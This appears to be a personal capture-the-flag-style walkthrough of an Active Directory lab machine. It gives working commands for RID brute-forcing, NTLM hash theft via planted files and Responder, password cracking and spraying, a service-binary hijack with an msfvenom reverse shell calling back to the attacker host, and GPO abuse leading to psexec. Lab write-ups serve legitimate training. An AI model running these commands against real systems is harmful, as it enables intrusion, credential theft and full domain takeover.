poerts 53 dns, 88 kerb, 135 rpc, 139 netbios, 389 ldap, 445 smb, 464, 593, 636, 3268 ldaps, 3269 ldaps?, 3389 rdp, 5985 winrm
636, 3269 =???

smb shows a writable share DocumentsShare
Usually would mean NTLM theft

rpc locked down

ldap seems locked down as wee

We do get a user, from rid-brute
`nxc smb IP -u 'anonymous' -p '' --rid-brute`

Now asreproast enabled
So, we're only left with thieving ntlm
`python ~/AD_tools/ntlm_theft/ntlm_theft.py -g all -s 192.168.45.160 -f pirates`
uploaded .lnk, .odf and .htm
start responder `sudo responder -I tun0 -A`
get anirudh's NTLM challenge-response

crack it - SecureHM
spray it
`for pro in smb rdp winrm; do nxc $pro 192.168.132.172 -u 'anirudh' -p 'SecureHM'; done`
pwned on winrm
anirudh!

---
we see anirudh is a member of "Server Operators" group
that means we can do `services` and see the modifiable services, check which ones; start name is NT Authority, and replace the binary with msfvenom, or nc command to get rev shell

we also see anirudh has seBackup and seRestore enabled
So, robocopy(diskshadow) or wbadmin will also work

---
diskshadow did not work, with some error `COM call "(*vssObject)->InitializeForBackup" failed.`

So we decide to exploit the "Server operators" group 
Windows Powershell:
```powershell
services
#we see a bunch, including something we had exploited in a previous machine, VMTools
sc.exe qc VMTools #--> make sure the SERVICE START NAME is LocalSystem
sc.exe config VMTools binPath="C:\programdata\shell.exe"
sc.exe stop VMTools
sc.exe start VMTools
```

Kali:
`msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.160 LPORT=445 -f exe-service -o bd.exe`
upload it to windows,
start listening `rlwrap nc -lvnp 445`

NT Authority!

---
---
---
```zsh
impacket-dacledit -action write -rights FullControl -principal anirudh -target "Default Domain Policy" vault.offsec/anirudh:SecureHM 
#"Target pricipal not found. wasnt working
#turns out, we dint need to do this, since we already have GenericWrite Or WriteOwner on it
```
```zsh pygoabuse
python3 /opt/pyGPOAbuse/pyGPOAbuse/pygpoabuse.py -dc-ip 192.168.132.172 vault.offsec/anirudh:'SecureHM' -gpo-id "31B2F340-016D-11D2-945F-00C04FB984F9"
impacket-psexec john@192.168.132.172
```